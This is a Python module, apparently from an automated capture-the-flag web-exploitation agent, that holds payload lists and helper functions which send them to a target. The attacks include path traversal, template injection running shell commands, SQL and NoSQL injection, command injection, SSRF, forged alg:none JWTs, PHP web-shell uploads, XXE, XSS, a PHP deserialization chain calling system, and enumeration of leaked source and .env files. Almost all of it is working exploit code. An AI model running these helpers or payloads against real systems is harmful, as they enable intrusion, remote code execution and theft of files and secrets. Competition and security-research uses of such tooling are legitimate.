from __future__ import annotations

import html
import io
import re
from typing import Any, Dict, Optional
from urllib.parse import parse_qsl, urlsplit, urlunsplit

LFI_PARAM_NAMES = {"file", "path", "page", "include", "template", "view", "filename", "filepath"}
LFI_FLAG_PAYLOADS = [
    "/flag",
    "/flag.txt",
    "../../../../flag",
    "../../../../flag.txt",
    "../../../../../flag",
    "../../../../../flag.txt",
    "php://filter/convert.base64-encode/resource=/flag",
]
SSTI_PARAM_NAMES = {"name", "template", "message", "content", "text", "q", "query", "search", "input"}
SSTI_DETECTION_PAYLOAD = "{{7*7}}"
SSTI_JINJA_FLAG_PAYLOAD = "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}"
SQLI_PARAM_NAMES = {"id", "uid", "item", "cat", "category", "product", "page", "q", "query", "search", "user", "username"}
SQLI_ERROR_MARKERS = [
    "sqlstate",
    "syntax error",
    "mysql",
    "sqlite",
    "postgres",
    "odbc",
    "unterminated",
    "unclosed quotation",
    "pdoexception",
]
SQLI_UNION_SUFFIXES = [
    " UNION SELECT flag FROM flag-- ",
    " UNION SELECT value FROM flag-- ",
    " UNION SELECT flag FROM flags-- ",
    " UNION SELECT value FROM flags-- ",
    " UNION SELECT flag FROM ctf-- ",
]
CMDI_PARAM_NAMES = {"cmd", "exec", "command", "shell", "ping", "ip", "host", "target", "query", "domain"}
CMDI_PAYLOADS = [
    ";cat /flag",
    "|cat /flag",
    "$(cat /flag)",
    "&&cat /flag",
    "||cat /flag",
    "`cat /flag`",
    ";cat /flag.txt",
    "|cat /flag.txt",
    ";tac /flag",
    "|tac /flag",
]
SSRF_PARAM_NAMES = {"url", "uri", "src", "href", "redirect", "link", "resource", "target"}
SSRF_FLAG_PAYLOADS = [
    "file:///flag",
    "file:///flag.txt",
    "file:///proc/self/environ",
    "http://127.0.0.1/flag",
    "http://127.0.0.1/flag.txt",
    "http://0.0.0.0/flag",
    "dict://127.0.0.1:6379/info",
]


def looks_like_newstar_php_pop_source(body: str) -> bool:
    normalized = html.unescape(re.sub(r"<[^>]+>", "", body)).replace("\xa0", " ")
    required = [
        "class Begin",
        "class Then",
        "class Handle",
        "class Super",
        "class CTF",
        "class WhiteGod",
        "unserialize",
        "$_POST",
        "pop",
    ]
    return all(item in normalized for item in required) or all(item in body for item in required)


def build_newstar_php_pop_payload() -> bytes:
    return (
        b'O:5:"Begin":1:{s:4:"name";'
        b'O:4:"Then":1:{s:10:"\x00Then\x00func";'
        b'O:5:"Super":1:{s:6:"\x00*\x00obj";'
        b'O:6:"Handle":1:{s:6:"\x00*\x00obj";'
        b'O:3:"CTF":1:{s:6:"handle";'
        b'O:8:"WhiteGod":2:{s:4:"func";s:6:"system";s:3:"var";s:9:"cat /flag";}'
        b'}}}}}}'
    )


def try_known_php_pop_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None
    body = str(tool_result.get("body") or "")
    if not looks_like_newstar_php_pop_source(body):
        return None
    url = str(tool_args.get("url") or agent.target)
    payload = build_newstar_php_pop_payload()
    try:
        response = agent._session.post(url, data={"pop": payload}, timeout=agent.runtime_config.http_timeout)
    except Exception as exc:  # noqa: BLE001
        return {"url": url, "error": f"{exc.__class__.__name__}: {exc}"}
    return {
        "helper": "deterministic_php_pop",
        "url": url,
        "status_code": response.status_code,
        "headers": dict(response.headers),
        "body": response.text,
    }


def try_lfi_flag_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None
    url = str(tool_result.get("url") or tool_args.get("url") or agent.target)
    split = urlsplit(url)
    params = dict(parse_qsl(split.query, keep_blank_values=True))
    candidate_names = [name for name in params if name.lower() in LFI_PARAM_NAMES]
    if not candidate_names:
        return None
    base_url = urlunsplit((split.scheme, split.netloc, split.path, "", split.fragment))
    for param_name in candidate_names:
        for payload in LFI_FLAG_PAYLOADS:
            probe_params = dict(params)
            probe_params[param_name] = payload
            try:
                response = agent._session.get(
                    base_url,
                    params=probe_params,
                    timeout=agent.runtime_config.http_timeout,
                    allow_redirects=True,
                )
            except Exception as exc:  # noqa: BLE001
                return {"helper": "deterministic_lfi", "url": base_url, "error": f"{exc.__class__.__name__}: {exc}"}
            if agent._check_flag_in_text(response.text):
                return {
                    "helper": "deterministic_lfi",
                    "url": str(response.url),
                    "param": param_name,
                    "payload": payload,
                    "status_code": response.status_code,
                    "headers": dict(response.headers),
                    "body": response.text,
                }
    return None


def try_ssti_flag_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None
    url = str(tool_result.get("url") or tool_args.get("url") or agent.target)
    split = urlsplit(url)
    params = dict(parse_qsl(split.query, keep_blank_values=True))
    candidate_names = [name for name in params if name.lower() in SSTI_PARAM_NAMES]
    if not candidate_names:
        return None
    base_url = urlunsplit((split.scheme, split.netloc, split.path, "", split.fragment))
    for param_name in candidate_names[:3]:
        detect_params = dict(params)
        detect_params[param_name] = SSTI_DETECTION_PAYLOAD
        try:
            detect_response = agent._session.get(
                base_url,
                params=detect_params,
                timeout=agent.runtime_config.http_timeout,
                allow_redirects=True,
            )
        except Exception as exc:  # noqa: BLE001
            return {"helper": "deterministic_ssti", "url": base_url, "error": f"{exc.__class__.__name__}: {exc}"}
        if "49" not in str(detect_response.text):
            continue
        exploit_params = dict(params)
        exploit_params[param_name] = SSTI_JINJA_FLAG_PAYLOAD
        try:
            exploit_response = agent._session.get(
                base_url,
                params=exploit_params,
                timeout=agent.runtime_config.http_timeout,
                allow_redirects=True,
            )
        except Exception as exc:  # noqa: BLE001
            return {"helper": "deterministic_ssti", "url": base_url, "error": f"{exc.__class__.__name__}: {exc}"}
        if agent._check_flag_in_text(str(exploit_response.text)):
            return {
                "helper": "deterministic_ssti",
                "url": str(exploit_response.url),
                "param": param_name,
                "probe": SSTI_DETECTION_PAYLOAD,
                "payload": SSTI_JINJA_FLAG_PAYLOAD,
                "status_code": exploit_response.status_code,
                "headers": dict(exploit_response.headers),
                "body": exploit_response.text,
            }
    return None


def try_sqli_flag_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None
    url = str(tool_result.get("url") or tool_args.get("url") or agent.target)
    split = urlsplit(url)
    params = dict(parse_qsl(split.query, keep_blank_values=True))
    candidate_names = [name for name in params if name.lower() in SQLI_PARAM_NAMES]
    if not candidate_names:
        return None
    base_url = urlunsplit((split.scheme, split.netloc, split.path, "", split.fragment))
    for param_name in candidate_names[:3]:
        original = params.get(param_name, "")
        detect_params = dict(params)
        detect_params[param_name] = f"{original}'"
        try:
            detect_response = agent._session.get(
                base_url,
                params=detect_params,
                timeout=agent.runtime_config.http_timeout,
                allow_redirects=True,
            )
        except Exception as exc:  # noqa: BLE001
            return {"helper": "deterministic_sqli", "url": base_url, "error": f"{exc.__class__.__name__}: {exc}"}
        detect_text = str(detect_response.text).lower()
        if not any(marker in detect_text for marker in SQLI_ERROR_MARKERS):
            continue
        for suffix in SQLI_UNION_SUFFIXES:
            exploit_params = dict(params)
            exploit_params[param_name] = f"{original}'{suffix}"
            try:
                exploit_response = agent._session.get(
                    base_url,
                    params=exploit_params,
                    timeout=agent.runtime_config.http_timeout,
                    allow_redirects=True,
                )
            except Exception as exc:  # noqa: BLE001
                return {"helper": "deterministic_sqli", "url": base_url, "error": f"{exc.__class__.__name__}: {exc}"}
            if agent._check_flag_in_text(str(exploit_response.text)):
                return {
                    "helper": "deterministic_sqli",
                    "url": str(exploit_response.url),
                    "param": param_name,
                    "probe": detect_params[param_name],
                    "payload": exploit_params[param_name],
                    "status_code": exploit_response.status_code,
                    "headers": dict(exploit_response.headers),
                    "body": exploit_response.text,
                }
    return None


def try_cmdi_flag_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    """Try command injection on suspected cmd/exec parameters."""
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None
    url = str(tool_result.get("url") or tool_args.get("url") or agent.target)
    split = urlsplit(url)
    params = dict(parse_qsl(split.query, keep_blank_values=True))
    candidate_names = [name for name in params if name.lower() in CMDI_PARAM_NAMES]
    if not candidate_names:
        return None
    base_url = urlunsplit((split.scheme, split.netloc, split.path, "", split.fragment))
    for param_name in candidate_names[:2]:
        for payload in CMDI_PAYLOADS:
            probe_params = dict(params)
            probe_params[param_name] = payload
            try:
                response = agent._session.get(
                    base_url,
                    params=probe_params,
                    timeout=agent.runtime_config.http_timeout,
                    allow_redirects=True,
                )
            except Exception as exc:  # noqa: BLE001
                return {"helper": "deterministic_cmdi", "url": base_url, "error": f"{exc.__class__.__name__}: {exc}"}
            if agent._check_flag_in_text(response.text):
                return {
                    "helper": "deterministic_cmdi",
                    "url": str(response.url),
                    "param": param_name,
                    "payload": payload,
                    "status_code": response.status_code,
                    "headers": dict(response.headers),
                    "body": response.text,
                }
    return None


def try_ssrf_flag_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    """Try SSRF on suspected url/uri/redirect parameters."""
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None
    url = str(tool_result.get("url") or tool_args.get("url") or agent.target)
    split = urlsplit(url)
    params = dict(parse_qsl(split.query, keep_blank_values=True))
    candidate_names = [name for name in params if name.lower() in SSRF_PARAM_NAMES]
    if not candidate_names:
        return None
    base_url = urlunsplit((split.scheme, split.netloc, split.path, "", split.fragment))
    for param_name in candidate_names[:2]:
        for payload in SSRF_FLAG_PAYLOADS:
            probe_params = dict(params)
            probe_params[param_name] = payload
            try:
                response = agent._session.get(
                    base_url,
                    params=probe_params,
                    timeout=agent.runtime_config.http_timeout,
                    allow_redirects=True,
                )
            except Exception as exc:  # noqa: BLE001
                return {"helper": "deterministic_ssrf", "url": base_url, "error": f"{exc.__class__.__name__}: {exc}"}
            if agent._check_flag_in_text(response.text):
                return {
                    "helper": "deterministic_ssrf",
                    "url": str(response.url),
                    "param": param_name,
                    "payload": payload,
                    "status_code": response.status_code,
                    "headers": dict(response.headers),
                    "body": response.text,
                }
    return None


# ---------------------------------------------------------------------------
# IDOR helper
# ---------------------------------------------------------------------------

IDOR_PARAM_NAMES = {"id", "uid", "user_id", "order_id", "doc_id", "file_id", "item_id", "account_id", "role_id"}
IDOR_TEST_VALUES = ["1", "2", "0", "-1", "999", "../1"]


def try_idor_flag_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    """Try IDOR by varying numeric/object identifier parameters."""
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None
    url = str(tool_result.get("url") or tool_args.get("url") or agent.target)
    split = urlsplit(url)
    params = dict(parse_qsl(split.query, keep_blank_values=True))
    candidate_names = [name for name in params if name.lower() in IDOR_PARAM_NAMES]
    if not candidate_names:
        return None
    base_url = urlunsplit((split.scheme, split.netloc, split.path, "", split.fragment))
    original = params.get(candidate_names[0], "")
    for test_val in IDOR_TEST_VALUES:
        if str(original) == test_val:
            continue
        probe_params = dict(params)
        probe_params[candidate_names[0]] = test_val
        try:
            response = agent._session.get(
                base_url,
                params=probe_params,
                timeout=agent.runtime_config.http_timeout,
                allow_redirects=True,
            )
        except Exception as exc:  # noqa: BLE001
            return {"helper": "deterministic_idor", "url": base_url, "error": f"{exc.__class__.__name__}: {exc}"}
        if agent._check_flag_in_text(response.text):
            return {
                "helper": "deterministic_idor",
                "url": str(response.url),
                "param": candidate_names[0],
                "payload": test_val,
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "body": response.text,
            }
    return None


# ---------------------------------------------------------------------------
# JWT forge helper
# ---------------------------------------------------------------------------

JWT_PARAM_NAMES = {"token", "jwt", "auth", "authorization", "access_token", "bear"}
JWT_FORGE_PAYLOADS = [
    # alg:none header + empty signature
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.",
    # alg:None variant
    "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.",
]


def try_jwt_forge_flag_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    """Try JWT alg:none / weak secret forgery on suspected token parameters."""
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None
    url = str(tool_result.get("url") or tool_args.get("url") or agent.target)
    split = urlsplit(url)
    params = dict(parse_qsl(split.query, keep_blank_values=True))
    candidate_names = [name for name in params if name.lower() in JWT_PARAM_NAMES]
    if not candidate_names:
        # Also check body for JWT tokens and try to inject via common param names
        candidate_names = ["token", "jwt", "auth"]
    base_url = urlunsplit((split.scheme, split.netloc, split.path, "", split.fragment))
    for param_name in candidate_names[:2]:
        for payload in JWT_FORGE_PAYLOADS:
            probe_params = dict(params)
            probe_params[param_name] = payload
            try:
                response = agent._session.get(
                    base_url,
                    params=probe_params,
                    timeout=agent.runtime_config.http_timeout,
                    allow_redirects=True,
                )
            except Exception as exc:  # noqa: BLE001
                return {"helper": "deterministic_jwt_forge", "url": base_url, "error": f"{exc.__class__.__name__}: {exc}"}
            if agent._check_flag_in_text(response.text):
                return {
                    "helper": "deterministic_jwt_forge",
                    "url": str(response.url),
                    "param": param_name,
                    "payload": payload,
                    "status_code": response.status_code,
                    "headers": dict(response.headers),
                    "body": response.text,
                }
    return None


# ---------------------------------------------------------------------------
# Upload helper
# ---------------------------------------------------------------------------

UPLOAD_PARAM_NAMES = {"file", "upload", "image", "avatar", "document", "attachment", "pic"}
UPLOAD_MALICIOUS_FILES = [
    ("shell.php", b"<?php echo system($_GET['cmd']); ?>", "image/png"),
    ("shell.jpg.php", b"<?php echo system($_GET['cmd']); ?>\nGIF89a", "image/jpeg"),
    ("shell.phtml", b"<?php echo system($_GET['cmd']); ?>", "application/octet-stream"),
]


def try_upload_flag_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    """Try file upload bypass on suspected upload endpoints."""
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None
    url = str(tool_result.get("url") or tool_args.get("url") or agent.target)
    body = str(tool_result.get("body", ""))
    # Heuristic: look for file input forms or upload endpoints
    has_upload_hint = any(p in url.lower() for p in ("upload", "file", "avatar", "image"))
    has_form_file = '<input type="file"' in body.lower() or 'enctype="multipart/form-data"' in body.lower()
    if not (has_upload_hint or has_form_file):
        return None
    for filename, filedata, mimetype in UPLOAD_MALICIOUS_FILES:
        try:
            files = {"file": (filename, io.BytesIO(filedata), mimetype)}
            response = agent._session.post(
                url,
                files=files,
                timeout=agent.runtime_config.http_timeout,
                allow_redirects=True,
            )
        except Exception as exc:  # noqa: BLE001
            return {"helper": "deterministic_upload", "url": url, "error": f"{exc.__class__.__name__}: {exc}"}
        if agent._check_flag_in_text(response.text):
            return {
                "helper": "deterministic_upload",
                "url": str(response.url),
                "filename": filename,
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "body": response.text,
            }
    return None


# ---------------------------------------------------------------------------
# XXE helper
# ---------------------------------------------------------------------------

XXE_PARAM_NAMES = {"xml", "data", "payload", "input", "doc", "file"}
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///flag">]><x>&xxe;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///flag.txt">]><x>&xxe;</x>',
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1/flag">]><x>&xxe;</x>',
]


# ---------------------------------------------------------------------------
# NoSQLi helper
# ---------------------------------------------------------------------------

NOSQLI_PARAM_NAMES = {"user", "username", "login", "email", "password", "search", "query", "filter"}
NOSQLI_PAYLOADS_MONGO = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    '{"$exists": true}',
    '{"$nin": []}',
    '{"$where": "return true"}',
]


def try_nosqli_flag_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    """检测 NoSQL 注入机会并尝试利用 (MongoDB/Redis)."""
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None
    url = str(tool_result.get("url") or tool_args.get("url") or agent.target)
    body = str(tool_result.get("body", ""))
    split = urlsplit(url)
    params = dict(parse_qsl(split.query, keep_blank_values=True))
    candidate_names = [name for name in params if name.lower() in NOSQLI_PARAM_NAMES]

    # Also detect NoSQL hints in the response body (MongoDB/Redis error messages)
    nosql_hints = [
        "mongo", "mongodb", "bson", "objectid",
        "redis", "jedis", "nosql",
        "json_decode", "json_encode",
    ]
    has_nosql_hint = any(hint in body.lower() for hint in nosql_hints)

    if not candidate_names and not has_nosql_hint:
        return None

    # If no candidate params from URL query, try common NoSQLi param names
    if not candidate_names:
        candidate_names = list(NOSQLI_PARAM_NAMES)[:4]

    base_url = urlunsplit((split.scheme, split.netloc, split.path, "", split.fragment))

    # Strategy 1: GET-based injection via query parameters
    for param_name in candidate_names[:3]:
        for payload in NOSQLI_PAYLOADS_MONGO:
            probe_params = dict(params)
            # MongoDB operator injection: param[$gt]=
            probe_params[f"{param_name}[$gt]"] = ""
            try:
                response = agent._session.get(
                    base_url,
                    params=probe_params,
                    timeout=agent.runtime_config.http_timeout,
                    allow_redirects=True,
                )
            except Exception as exc:  # noqa: BLE001
                return {"helper": "deterministic_nosqli", "url": base_url, "error": f"{exc.__class__.__name__}: {exc}"}
            if agent._check_flag_in_text(response.text):
                return {
                    "helper": "deterministic_nosqli",
                    "url": str(response.url),
                    "param": param_name,
                    "payload": f"{param_name}[$gt]=",
                    "status_code": response.status_code,
                    "headers": dict(response.headers),
                    "body": response.text,
                }

    # Strategy 2: POST-based JSON injection
    for param_name in candidate_names[:3]:
        for payload in NOSQLI_PAYLOADS_MONGO:
            json_body = {param_name: {"$gt": ""}}
            try:
                response = agent._session.post(
                    base_url,
                    json=json_body,
                    timeout=agent.runtime_config.http_timeout,
                    allow_redirects=True,
                )
            except Exception as exc:  # noqa: BLE001
                return {"helper": "deterministic_nosqli", "url": base_url, "error": f"{exc.__class__.__name__}: {exc}"}
            if agent._check_flag_in_text(response.text):
                return {
                    "helper": "deterministic_nosqli",
                    "url": str(response.url),
                    "param": param_name,
                    "payload": payload,
                    "status_code": response.status_code,
                    "headers": dict(response.headers),
                    "body": response.text,
                }

    return None


# ---------------------------------------------------------------------------
# XSS helper
# ---------------------------------------------------------------------------

XSS_CONTEXTS = ["html_body", "attribute", "script", "url"]
XSS_PAYLOADS: Dict[str, list] = {
    "html_body": [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
    ],
    "attribute": [
        '" onmouseover="alert(1)',
        "' onfocus='alert(1)",
        '" autofocus onfocus="alert(1)',
        "' autofocus onfocus='alert(1)",
    ],
    "script": [
        '";alert(1)//',
        "';alert(1)//",
        '</script><script>alert(1)</script>',
        '\\";alert(1)//',
    ],
    "url": [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'javascript:alert(document.domain)',
    ],
}

XSS_PARAM_NAMES = {"q", "query", "search", "name", "message", "comment", "text", "input", "value", "content", "redirect", "url", "next", "return"}


def _detect_xss_context(body: str, probe: str) -> str:
    """Detect the HTML context where the probe string is reflected."""
    if not probe or probe not in body:
        return "html_body"

    idx = body.find(probe)
    # Look backwards from the reflection point to determine context
    preceding = body[max(0, idx - 200):idx].lower()

    # Check if inside a <script> block
    last_script_open = preceding.rfind("<script")
    last_script_close = preceding.rfind("</script")
    if last_script_open > last_script_close:
        return "script"

    # Check if inside a URL attribute (href, src, action) - must check before generic attribute
    url_attr_pattern = re.compile(r'(href|src|action)\s*=\s*["\']?[^"\'>\s]*$', re.IGNORECASE)
    if url_attr_pattern.search(preceding):
        return "url"

    # Check if inside an HTML attribute (look for unclosed quote)
    last_tag_open = preceding.rfind("<")
    last_tag_close = preceding.rfind(">")
    if last_tag_open > last_tag_close:
        # We're inside a tag - check for attribute context
        after_tag = preceding[last_tag_open:]
        if after_tag.count('"') % 2 == 1 or after_tag.count("'") % 2 == 1:
            return "attribute"

    return "html_body"


def try_xss_flag_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    """检测 XSS 反射并尝试利用."""
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None
    url = str(tool_result.get("url") or tool_args.get("url") or agent.target)
    body = str(tool_result.get("body", ""))
    split = urlsplit(url)
    params = dict(parse_qsl(split.query, keep_blank_values=True))
    candidate_names = [name for name in params if name.lower() in XSS_PARAM_NAMES]

    if not candidate_names:
        return None

    base_url = urlunsplit((split.scheme, split.netloc, split.path, "", split.fragment))

    for param_name in candidate_names[:3]:
        # Step 1: Send a unique probe to detect reflection
        probe = "xSsT3sT" + param_name[:4]
        probe_params = dict(params)
        probe_params[param_name] = probe
        try:
            probe_response = agent._session.get(
                base_url,
                params=probe_params,
                timeout=agent.runtime_config.http_timeout,
                allow_redirects=True,
            )
        except Exception as exc:  # noqa: BLE001
            return {"helper": "deterministic_xss", "url": base_url, "error": f"{exc.__class__.__name__}: {exc}"}

        # Check if the probe is reflected in the response
        if probe not in probe_response.text:
            continue

        # Step 2: Determine the HTML context of the reflection
        context = _detect_xss_context(probe_response.text, probe)

        # Step 3: Try context-appropriate XSS payloads
        payloads = XSS_PAYLOADS.get(context, XSS_PAYLOADS["html_body"])
        for payload in payloads:
            exploit_params = dict(params)
            exploit_params[param_name] = payload
            try:
                exploit_response = agent._session.get(
                    base_url,
                    params=exploit_params,
                    timeout=agent.runtime_config.http_timeout,
                    allow_redirects=True,
                )
            except Exception as exc:  # noqa: BLE001
                return {"helper": "deterministic_xss", "url": base_url, "error": f"{exc.__class__.__name__}: {exc}"}

            # Step 4: Check if the flag is in the response
            if agent._check_flag_in_text(exploit_response.text):
                return {
                    "helper": "deterministic_xss",
                    "url": str(exploit_response.url),
                    "param": param_name,
                    "context": context,
                    "payload": payload,
                    "status_code": exploit_response.status_code,
                    "headers": dict(exploit_response.headers),
                    "body": exploit_response.text,
                }

    return None


def try_xxe_flag_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    """Try XXE injection on suspected XML endpoints."""
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None
    url = str(tool_result.get("url") or tool_args.get("url") or agent.target)
    body = str(tool_result.get("body", ""))
    # Heuristic: XML-related endpoint or response
    is_xml_endpoint = any(p in url.lower() for p in ("xml", "soap", "api", "rest"))
    has_xml_content = "<?xml" in body or "<soap" in body.lower()
    if not (is_xml_endpoint or has_xml_content):
        return None
    headers = {"Content-Type": "application/xml"}
    for payload in XXE_PAYLOADS:
        try:
            response = agent._session.post(
                url,
                data=payload,
                headers=headers,
                timeout=agent.runtime_config.http_timeout,
                allow_redirects=True,
            )
        except Exception as exc:  # noqa: BLE001
            return {"helper": "deterministic_xxe", "url": url, "error": f"{exc.__class__.__name__}: {exc}"}
        if agent._check_flag_in_text(response.text):
            return {
                "helper": "deterministic_xxe",
                "url": str(response.url),
                "payload": payload,
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "body": response.text,
            }
    return None


# ---------------------------------------------------------------------------
# DirEnum helper
# ---------------------------------------------------------------------------

COMMON_PATHS = [
    "/admin", "/api", "/api/v1", "/api/v2", "/backup", "/config",
    "/debug", "/docs", "/env", "/.env", "/flag", "/flag.txt",
    "/hidden", "/internal", "/login", "/panel", "/secret",
    "/swagger", "/swagger.json", "/robots.txt", "/sitemap.xml",
    "/.git/HEAD", "/wp-admin", "/phpmyadmin", "/console",
    "/actuator", "/health", "/metrics", "/graphql",
    "/admin.php", "/info.php", "/phpinfo.php",
    "/backup.zip", "/backup.tar.gz", "/db.sql",
    "/api/flag", "/api/admin", "/api/users",
    # Source code leak paths (critical for CTF)
    "/www.zip", "/www.tar.gz", "/www.rar", "/web.zip",
    "/source.zip", "/src.zip", "/code.zip", "/app.zip",
    "/website.zip", "/html.zip", "/dist.zip",
    "/.svn/entries", "/.svn/wc.db",
    "/.git/config", "/.gitignore",
    "/.DS_Store", "/WEB-INF/web.xml",
    "/composer.json", "/package.json",
    # Framework-specific paths
    "/album", "/application", "/module", "/vendor",
    "/public", "/data", "/storage", "/upload", "/uploads",
    "/static", "/assets", "/media", "/files",
]


def try_source_leak_chain_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    """Source leak detection and attack chain trigger.

    When dir enumeration finds backup/leak paths (e.g., /www.zip, /.git/HEAD,
    /composer.json) returning 200, this helper triggers the full PHP attack
    chain: source download -> PHP audit -> deser/upload/direct exploit -> flag.

    Validates: Phase 6 attack chain integration.
    """
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None

    url = str(tool_result.get("url") or tool_args.get("url") or agent.target)
    status_code = tool_result.get("status_code", 0)
    body = str(tool_result.get("body", ""))

    # Detect source leak indicators in the URL or response
    url_lower = url.lower()
    source_indicators = [
        ".zip", ".tar.gz", ".rar", ".sql",
        "/.git/", "/.svn/",
        "/composer.json", "/package.json",
        "/.env", "/.ds_store",
        "/phpinfo.php", "/info.php",
        "wp-config.php",
    ]
    has_source_indicator = any(ind in url_lower for ind in source_indicators)

    if not has_source_indicator or status_code != 200:
        return None

    # Found a source leak — run the full attack chain
    try:
        from ..attack_chain_orchestrator import run_php_attack_chain
        from urllib.parse import urlsplit

        split = urlsplit(url)
        base_url = f"{split.scheme}://{split.netloc}"
        work_dir = str(getattr(agent, "_work_dir", "ctf_workspace"))

        result = run_php_attack_chain(
            session=agent._session,
            target_url=base_url,
            work_dir=work_dir,
            timeout=getattr(agent.runtime_config, "http_timeout", 15),
        )

        if result.success and result.flag:
            return {
                "helper": "source_leak_chain",
                "url": base_url,
                "flag": result.flag,
                "chain_steps": [s.to_dict() for s in result.chain_steps],
                "exploit_used": result.exploit_used,
                "vulns_found": len(result.vulnerabilities),
                "total_duration_ms": result.total_duration_ms,
            }

        # Even if no flag, report findings
        if result.vulnerabilities:
            return {
                "helper": "source_leak_chain",
                "url": base_url,
                "source_leak": result.source_leak.to_dict() if result.source_leak else None,
                "vulnerabilities": [v.to_dict() for v in result.vulnerabilities[:10]],
                "note": "Source leak found, vulnerabilities identified but flag not captured",
            }
    except Exception:  # noqa: BLE001
        pass

    return None


def try_direnum_from_tool_result(
    *,
    agent: Any,
    tool_name: str,
    tool_args: Dict[str, Any],
    tool_result: Dict[str, Any],
) -> Optional[Dict[str, Any]]:
    """目录枚举 - 基于常见路径列表发现隐藏端点并尝试获取 flag.

    触发条件:
        1. 当前请求落在根/索引页 (path 为 "" 或 "/index.*").
        2. 上一次响应是 404, 暗示路径不存在但站点存在.
        3. 响应体出现 "index of" / "directory listing" / "not found" 等线索.

    针对上述场景, 该 helper 会基于 ``COMMON_PATHS`` (后台/调试/备份/泄露
    类常见目录与文件) 逐个发起 GET 请求, 命中 flag 则返回结构化结果.
    遇到网络异常时跳过该路径并继续枚举其余目标, 不会中断 Agent 主循环.

    Validates: Requirements 6.3
    """
    if tool_name != "http_request" or not agent.runtime_config.exploit_enabled:
        return None

    url = str(tool_result.get("url") or tool_args.get("url") or agent.target)
    status_code = tool_result.get("status_code", 0)
    body = str(tool_result.get("body", ""))

    # Only trigger on initial page loads (root or index pages) or 404 responses
    # that suggest we should enumerate more paths
    split = urlsplit(url)
    path = split.path.rstrip("/")

    # Trigger conditions:
    # 1. We're on a root/index page (path is empty or /)
    # 2. We got a 404 suggesting the path doesn't exist
    # 3. Response hints at hidden content (e.g., "not found", directory listing)
    is_root = path in ("", "/", "/index.html", "/index.php")
    is_404 = status_code == 404
    has_dir_hint = any(h in body.lower() for h in ("index of", "directory listing", "not found", "404"))

    if not (is_root or is_404 or has_dir_hint):
        return None

    base_url = f"{split.scheme}://{split.netloc}"

    # Enumerate common paths looking for interesting responses
    for enum_path in COMMON_PATHS:
        target_url = base_url + enum_path
        try:
            response = agent._session.get(
                target_url,
                timeout=agent.runtime_config.http_timeout,
                allow_redirects=True,
            )
        except Exception:  # noqa: BLE001
            continue  # Skip failed paths, continue enumeration

        # Check if we found a flag
        if agent._check_flag_in_text(response.text):
            return {
                "helper": "deterministic_direnum",
                "url": str(response.url),
                "path": enum_path,
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "body": response.text,
            }

    return None
